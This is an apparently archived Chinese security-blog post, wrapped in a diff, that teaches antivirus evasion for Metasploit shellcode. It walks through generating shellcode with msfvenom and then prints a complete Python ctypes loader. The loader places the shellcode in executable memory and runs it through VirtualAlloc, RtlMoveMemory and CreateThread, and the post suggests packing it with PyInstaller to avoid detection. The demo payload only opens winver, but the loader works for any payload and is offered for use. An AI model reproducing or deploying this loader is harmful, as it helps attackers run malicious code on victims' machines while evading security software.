@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>msf shellcode bypass | X1r0z Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="利用 Python 在内存中执行 ShellCode, 经过 Pynstaller 的封装达到免杀的效果.  在 Freebuf 看各种 APT 分析的时候总能找到 “不落地” “内存执行” 之类的字词, 无奈 C++ 不会, 只能用 Python. 至于 C++ 里面的 windows api, 可以用 ctypes 库来实现. Functions一些在 windows 中进行内存操作的函数">
+<meta name="keywords" content="bypass,metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="msf shellcode bypass">
+<meta property="og:url" content="https://exp10it.cn/2018/05/03/msf-shellcode-bypass/index.html">
+<meta property="og:site_name" content="X1r0z Blog">
+<meta property="og:description" content="利用 Python 在内存中执行 ShellCode, 经过 Pynstaller 的封装达到免杀的效果.  在 Freebuf 看各种 APT 分析的时候总能找到 “不落地” “内存执行” 之类的字词, 无奈 C++ 不会, 只能用 Python. 至于 C++ 里面的 windows api, 可以用 ctypes 库来实现. Functions一些在 windows 中进行内存操作的函数">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://exp10it-1252109039.cossh.myqcloud.com/2018/05/03/1525350811.jpg">
+<meta property="og:updated_time" content="2018-08-02T03:03:54.629Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="msf shellcode bypass">
+<meta name="twitter:description" content="利用 Python 在内存中执行 ShellCode, 经过 Pynstaller 的封装达到免杀的效果.  在 Freebuf 看各种 APT 分析的时候总能找到 “不落地” “内存执行” 之类的字词, 无奈 C++ 不会, 只能用 Python. 至于 C++ 里面的 windows api, 可以用 ctypes 库来实现. Functions一些在 windows 中进行内存操作的函数">
+<meta name="twitter:image" content="http://exp10it-1252109039.cossh.myqcloud.com/2018/05/03/1525350811.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="X1r0z Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/plugin/images/avatar.jpg">
+    <h2 class="author">X1r0z</h2>
+    <h3 class="description">剑之所指, 心之所向</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>97</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>10</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>54</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+          <a href="/about" title="About">
+            <li>关于</li>
+          </a>
+        
+          <a href="/project" title="Project">
+            <li>项目</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-msf-shellcode-bypass" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/05/03/msf-shellcode-bypass/" class="article-date">
+  <time class="post-time" datetime="2018-05-02T16:00:00.000Z" itemprop="datePublished">
+    <span class="post-month">5月</span><br/>
+    <span class="post-day">03</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      msf shellcode bypass
+    </h1>
+  
+
+        <div>
+          
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/bypass/">bypass</a>
+  </div>
+
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>利用 Python 在内存中执行 ShellCode, 经过 Pynstaller 的封装达到免杀的效果.</p>
+</blockquote>
+<p>在 Freebuf 看各种 APT 分析的时候总能找到 “不落地” “内存执行” 之类的字词, 无奈 C++ 不会, 只能用 Python.</p>
+<p>至于 C++ 里面的 windows api, 可以用 ctypes 库来实现.</p>
+<h2 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h2><p>一些在 windows 中进行内存操作的函数</p>
+<p><em>ctypes 中的  windows api 调用格式为 ctypes.windll.kernel32.xxx</em></p>
+<a id="more"></a>
+<h3 id="VirtualAlloc"><a href="#VirtualAlloc" class="headerlink" title="VirtualAlloc"></a>VirtualAlloc</h3><p>申请内存地址</p>
+<p> 声明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LPVOID VirtualAlloc&#123;</span><br><span class="line">LPVOID lpAddress,</span><br><span class="line">DWORD dwSize,</span><br><span class="line">DWORD flAllocationType,</span><br><span class="line">DWORD flProtect</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lpAddress 分配的内存区域地址</span><br><span class="line">dwSite 分配大小</span><br><span class="line">flAllocationType 分配类型</span><br><span class="line">flProtect 初始保护属性</span><br></pre></td></tr></table></figure>
+<p>flAllocationType 这里设为 0x1000, 申请内存并初始化.</p>
+<p>flProtect 则为 0x40, 即可执行, 可读写.</p>
+<h3 id="RtllMoveMemory"><a href="#RtllMoveMemory" class="headerlink" title="RtllMoveMemory"></a>RtllMoveMemory</h3><p>将内容复制到指定的内存地址</p>
+<p>声明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VOID RtlMoveMemory(</span><br><span class="line">VOID UNALIGNED *Destination,</span><br><span class="line">const VOID UNALIGNED *Source,</span><br><span class="line">SIZE_T Length</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Destination 目的地址的指针</span><br><span class="line">Source 数据</span><br><span class="line">Length 长度</span><br></pre></td></tr></table></figure>
+<p>Destination 就是之前申请内存地址的引用.</p>
+<h3 id="CreateThread"><a href="#CreateThread" class="headerlink" title="CreateThread"></a>CreateThread</h3><p>创建线程</p>
+<p>声明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HANDLE CreateThread(</span><br><span class="line">LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="line">SIZE_T dwStackSize,</span><br><span class="line">LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">LPVOID lpParameter,</span><br><span class="line">DWORD dwCreationFlags,</span><br><span class="line">LPDWORD lpThreadId</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lpThreadAttributes 定义新线程的安全属性 默认为 0</span><br><span class="line">dwStackSize 线程堆栈大小 默认为 0</span><br><span class="line">lpStartAddress 指向线程函数地址 (具体执行的代码)</span><br><span class="line">lpParameter 传递给线程函数的参数 默认为 0</span><br><span class="line">dwCreationFlags 线程运行状态 0 为立即执行</span><br><span class="line">lpThreadId 线程 ID 编号</span><br></pre></td></tr></table></figure>
+<p>lpStartAddress 仍为之前申请内存地址的引用.</p>
+<h3 id="WaitForSingleObject"><a href="#WaitForSingleObject" class="headerlink" title="WaitForSingleObject"></a>WaitForSingleObject</h3><p>监听 handle 状态</p>
+<p>声明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD WaitForSingleObject(</span><br><span class="line">HANDLE hHandle,</span><br><span class="line">DWORD dwMilliseconds</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hHandle 对象句柄</span><br><span class="line">dwMilliseconds 定时时间间隔 指定为非零值表示一直等待直到 Handle 触发 .</span><br></pre></td></tr></table></figure>
+<p>hHandle 为之前创建线程函数的引用.</p>
+<h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from_buffer_copy 解码 shellcode</span><br><span class="line">c_int C++ 的 int 类型</span><br><span class="line">c_char C++ 的 char 类型</span><br><span class="line">pointer C++ 的 指针</span><br></pre></td></tr></table></figure>
+<h2 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h2><p>首先引入 ctypes 库.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br></pre></td></tr></table></figure>
+<p><strong>生成 shellcode</strong></p>
+<p>这里执行 win 自带的命令 winver.</p>
+<p><code>msfvenom -p windows/exec CMD=winver -f c</code></p>
+<p>返回结果.</p>
+<p><code>unsigned char shellcode[]=&#39;xxxx&#39;</code></p>
+<p><strong>整理 shellcode</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">shellcode = b&quot;&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x77\x69\x6e\x76&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x65\x72\x00&quot;</span><br></pre></td></tr></table></figure>
+<p><strong>申请内存地址</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))</span><br></pre></td></tr></table></figure>
+<p>如果你还不明白 请回头看上面的 Functions.</p>
+<p><strong>解码 shellcode</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)</span><br></pre></td></tr></table></figure>
+<p>C++ 中没有 string 类型 所以只能用 char * Length 的方式保存字符串.</p>
+<p><strong>复制到指定内存地址</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))</span><br></pre></td></tr></table></figure>
+<p>这里对 ptr 进行了 C++ int, 因为引用是 Python 变量, 而 Python 是动态语言, 所以要进行类型转换. 下面的也一样.</p>
+<p><strong>创建线程</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))</span><br></pre></td></tr></table></figure>
+<p><strong>监听 handle 状态</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
+<p><strong>全部代码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">shellcode = b&quot;&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x77\x69\x6e\x76&quot;</span><br><span class="line">shellcode = shellcode  + b&quot;\x65\x72\x00&quot;</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x4000),ctypes.c_int(0x40))</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))</span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
+<p>之后可以对它进行封装 例如:</p>
+<p><a href="https://github.com/curtis992250/shecodject" target="_blank" rel="noopener">curtis992250/shecodject</a></p>
+<p>或者用 Pyinstaller.</p>
+<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><p>当然是弹出了我们可爱的 ver 界面.</p>
+<p><img src="http://exp10it-1252109039.cossh.myqcloud.com/2018/05/03/1525350811.jpg" alt="1.jpg"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://exp10it.cn/2018/05/03/msf-shellcode-bypass/" data-id="cjkbzjdp800aobqnt79r09kjl" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bypass/">bypass</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/metasploit/">metasploit</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/05/04/powershell-execution-bypass/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <div class="article-nav-title">
+        
+          powershell execution bypass
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/05/02/clean-log-safely/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">安全清理日志</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">X1r0z Blog</h1>
+    <h2 class="blog-subtitle">剑之所指, 心之所向</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+          <a href="/about" title="About">
+            <li>关于</li>
+          </a>
+        
+          <a href="/project" title="Project">
+            <li>项目</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/plugin/images/avatar.jpg">
+    <h2 class="author">X1r0z</h2>
+    <h3 class="description">剑之所指, 心之所向</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>97</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>10</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>54</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="https://github.com/X1r0z" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="https://chabug.org/" target="_blank" title="ChaBug">
+          ChaBug
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://blog.dyboy.cn/" target="_blank" title="DYBOY">
+          DYBOY
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://exp10it.cn/" target="_blank" title="超级无敌宇宙大帅比">
+          超级无敌宇宙大帅比
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2017 - 2018 X1r0z<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+            <a href="/about" title="" class="menuItem">关于</a>
+          
+            <a href="/project" title="" class="menuItem">项目</a>
+          
+        </div>
+        
+          <audio id="audio" src="plugin/galmenu/wulusai.mp3"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
